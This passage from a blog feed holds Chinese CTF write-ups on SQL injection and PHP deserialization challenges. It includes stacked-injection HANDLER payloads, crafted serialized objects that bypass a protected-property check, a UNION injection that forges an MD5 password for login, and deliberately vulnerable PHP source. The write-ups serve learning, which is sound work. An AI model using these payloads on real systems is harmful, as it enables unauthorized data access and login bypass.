src="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210320001442557.png" class="lazyload" data-srcset="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210320001442557.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210320001442557"></p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[GYCTF2020]Blacklist</title>
      <link href="2021/03/14/GYCTF2020-Blacklist/"/>
      <url>2021/03/14/GYCTF2020-Blacklist/</url>
      
        <content type="html"><![CDATA[<p>这个题可以说是强网杯随便注2.0了吧</p><span id="more"></span><h3 id="0x01前置知识"><a href="#0x01前置知识" class="headerlink" title="0x01前置知识"></a>0x01前置知识</h3><p>mysql文档中有一种新的读取数据的方法，号称比select快<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">文档</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure><h3 id="0x02信息收集"><a href="#0x02信息收集" class="headerlink" title="0x02信息收集"></a>0x02信息收集</h3><p><img src="/2021/03/14/GYCTF2020-Blacklist/image-20210317213251303.png" class="lazyload" data-srcset="/2021/03/14/GYCTF2020-Blacklist/image-20210317213251303.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210317213251303"></p><p>sql注入,<code>&#39;</code>测试发现字符型注入</p><p>测试联合注入 </p><p><img src="/2021/03/14/GYCTF2020-Blacklist/image-20210317213430167.png" class="lazyload" data-srcset="/2021/03/14/GYCTF2020-Blacklist/image-20210317213430167.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210317213430167"></p><p>部分sql语句关键字被过滤 ，构造报错注入也被过滤</p><p><img src="/2021/03/14/GYCTF2020-Blacklist/image-20210317213608533.png" class="lazyload" data-srcset="/2021/03/14/GYCTF2020-Blacklist/image-20210317213608533.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210317213608533"></p><p>真和强网杯随便注差不多，开始堆叠注入</p><p><code>1&#39;;show databases;</code></p><p><img src="/2021/03/14/GYCTF2020-Blacklist/image-20210317213718062.png" class="lazyload" data-srcset="/2021/03/14/GYCTF2020-Blacklist/image-20210317213718062.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210317213718062"></p><p><code>1&#39;;use ctftraining;show columns from FLAG_TABLE;</code></p><p><img src="/2021/03/14/GYCTF2020-Blacklist/image-20210317214256774.png" class="lazyload" data-srcset="/2021/03/14/GYCTF2020-Blacklist/image-20210317214256774.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210317214256774"></p><p>显然flag并没有在这里</p><p><code>1&#39;;show tables from supersqli;</code> 换库</p><p><img src="/2021/03/14/GYCTF2020-Blacklist/image-20210317214409552.png" class="lazyload" data-srcset="/2021/03/14/GYCTF2020-Blacklist/image-20210317214409552.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210317214409552"></p><p><code>1&#39;;use supersqli;show columns from  FlagHere;</code></p><p><img src="/2021/03/14/GYCTF2020-Blacklist/image-20210317214549737.png" class="lazyload" data-srcset="/2021/03/14/GYCTF2020-Blacklist/image-20210317214549737.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210317214549737"></p><p>想办法读这个flag，通过<a href="http://m0th.top/2019/12/04/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">强网杯随便注</a>一题的学习,我们应该可以有两种方式来读数据</p><p>一种是通过alter替换表名的方式通过现在这个查询数据的接口出来，显然这种方式并不能成立因为alter被ban掉了</p><p>于是我们来看看预编译还能做的通吗</p><p>prepared函数被ban掉</p><p>简单看一下预处理的语法</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 定义预处理语句</span><br><span class="line">PREPARE stmt_name FROM preparable_stmt;</span><br><span class="line"># 执行预处理语句</span><br><span class="line">EXECUTE stmt_name [USING @var_name [, @var_name] ...];</span><br><span class="line"># 删除(释放)定义</span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;</span><br></pre></td></tr></table></figure></blockquote><p>我么需要预处理的语句是 <code>select flag from FlagHere</code></p><p>必然需要用到 prepared函数于是也没了</p><p>0x03 payload</p><p>根据前置知识，我们构造如下payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close</span><br></pre></td></tr></table></figure><p><img src="/2021/03/14/GYCTF2020-Blacklist/image-20210317220933322.png" class="lazyload" data-srcset="/2021/03/14/GYCTF2020-Blacklist/image-20210317220933322.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210317220933322"></p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bypass </tag>
            
            <tag> 堆叠注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2020 青龙组]AreUSerialz</title>
      <link href="2021/03/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/"/>
      <url>2021/03/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h3 id="0x01前置知识"><a href="#0x01前置知识" class="headerlink" title="0x01前置知识"></a>0x01前置知识</h3><p><strong>如何bypass protected 和 private 属性</strong></p><blockquote><p>PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过</p><p>private属性序列化的时候会引入两个\x00，注意这两个\x00就是ascii码为0的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得很清楚了。同理，protected属性会引入\x00*\x00。此时，为了更加方便进行反序列化Payload的传输与显示，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。</p><p>参考自：<a href="https://blog.csdn.net/Oavinci/article/details/106998738">https://blog.csdn.net/Oavinci/article/details/106998738</a></p></blockquote><p>0x02源码分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;  <span class="comment">//5该函数由op值决定调用 write 还是 read 函数，显然我们希望调用read()</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123; <span class="comment">//6弱相等</span></span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename); <span class="comment">//7这个地方是回显点</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; <span class="comment">//3反序列化后自动调用</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>) <span class="comment">//4强相等</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process(); <span class="comment">//5调用process函数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123; <span class="comment">//1本函数限制了我们的payload只能在ascii码为32到125之间取</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>); <span class="comment">//2直接反序列化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析完代码逻辑，就只有两个点了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op ===<span class="string">&quot;2&quot;</span>) 返回<span class="literal">false</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op ==<span class="string">&quot;2&quot;</span>) 返回<span class="literal">true</span></span><br></pre></td></tr></table></figure><p>通过整数2即可让bypass</p><p>另一个点即前置知识中提到 bypass protected 属性</p><h3 id="0x03-构造payload"><a href="#0x03-构造payload" class="headerlink" title="0x03 构造payload"></a>0x03 构造payload</h3><ol><li><p>我们利用php7对属性不敏感来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$a</span>-&gt;op=<span class="number">2</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A7%3A%22content%22%3BN%3B%7D</p></blockquote></li><li><p>我们利用 s 改写成S 支持16进制来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//自己简单将输出手动修改为</span></span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[GXYCTF2019]BabySQli</title>
      <link href="2021/03/09/GXYCTF2019-BabySQli/"/>
      <url>2021/03/09/GXYCTF2019-BabySQli/</url>
      
        <content type="html"><![CDATA[<p>一种绕过登入验证password进行md5处理的方法</p><span id="more"></span><p>0x01 信息收集</p><p>一个朴实无华的登入框</p><p><img src="/2021/03/09/GXYCTF2019-BabySQli/image-20210309001134758.png" class="lazyload" data-srcset="/2021/03/09/GXYCTF2019-BabySQli/image-20210309001134758.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210309001134758"></p><p>那burp先简单fuzz下看过滤了什么</p><p><img src="/2021/03/09/GXYCTF2019-BabySQli/image-20210309001349785.png" class="lazyload" data-srcset="/2021/03/09/GXYCTF2019-BabySQli/image-20210309001349785.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210309001349785"></p><p>or多给了这个东西</p><p><img src="/2021/03/09/GXYCTF2019-BabySQli/image-20210309001431278.png" class="lazyload" data-srcset="/2021/03/09/GXYCTF2019-BabySQli/image-20210309001431278.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210309001431278"></p><p>base32编码 后base64 编码得到 一句经典的sql语句</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></figure></blockquote><p>字符型注入</p><h4 id="0x02构造exp"><a href="#0x02构造exp" class="headerlink" title="0x02构造exp"></a>0x02构造exp</h4><p>经过多次尝试发现 <code>or、=、()、order</code>被ban掉了，其他正常，不过回显只有 wrong user，wrong pass</p><p>好奇后端是怎么验证的？ 先验证 username 再验证password,再来看他的sql语句</p><blockquote><p>select * from user where username=’$name’</p></blockquote><p>相必先带入 username 执行sql语句 取出 数据</p><p>然后在将数据库中的passwd 与我们所传进行校验，其代码猜测为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$pw</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username=&#x27;&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$result_array</span>=mysql_fetch_row(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result_array</span>[<span class="number">1</span>]==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;wrong user&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result_array</span>[<span class="number">2</span>]===md5(<span class="variable">$pw</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;wrong pass&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>于是绕过方式就比较简单了</p><blockquote><p>username:admi’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70 </p><p>password:123</p><p> md5(123)=’202cb962ac59075b964b07152d234b70’</p></blockquote><p><img src="/2021/03/09/GXYCTF2019-BabySQli/image-20210310210055728.png" class="lazyload" data-srcset="/2021/03/09/GXYCTF2019-BabySQli/image-20210310210055728.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210310210055728"></p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2018]Fakebook</title>
      <link href="2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/"/>
      <url>2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/</url>
      
